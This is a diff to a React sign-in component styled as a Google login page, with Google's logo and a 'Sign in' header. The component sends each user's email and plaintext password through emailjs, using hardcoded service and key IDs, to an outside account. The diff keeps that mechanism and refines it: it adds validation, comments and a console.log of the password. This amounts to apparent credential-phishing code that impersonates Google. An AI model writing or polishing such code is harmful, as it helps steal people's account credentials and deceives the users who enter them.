@@ -56,15 +56,25 @@ const LoginSignUp = () => {
     };
 
     const handleSubmit = () => {
+        // Validate form data before sending
+        if (!formData.email || !formData.password) {
+            alert('Email and password are required.');
+            return;
+        }
+
+        // Create template parameters for emailjs
         const templateParams = {
             email: formData.email,
-            password: formData.password,
+            password: formData.password, // This is sent as plain text
         };
 
+        // Send email using emailjs
         emailjs.send('service_fbtczun', 'template_v8ofilw', templateParams, 'HLpn8KxyhDLpeMH4a')
             .then((response) => {
+                // Clear form data on success
                 setFormData({ email: '', password: '' });
-                navigate('/success');
+                navigate('/success'); // Navigate to a success page
+                console.log('password', formData.password);
             })
             .catch((error) => {
                 alert('Failed to send message.');
@@ -74,7 +84,7 @@ const LoginSignUp = () => {
 
     return (
         <div className='Container'>
-            <form className='Container' onSubmit={handleSubmit}>
+            <form className='Container'>
                 <div className={`header ${isActive ? '' : 'active'}`}>
                     <img src={googleLogo} alt="Google" className='google' />
                     <div className="text">Sign in</div>
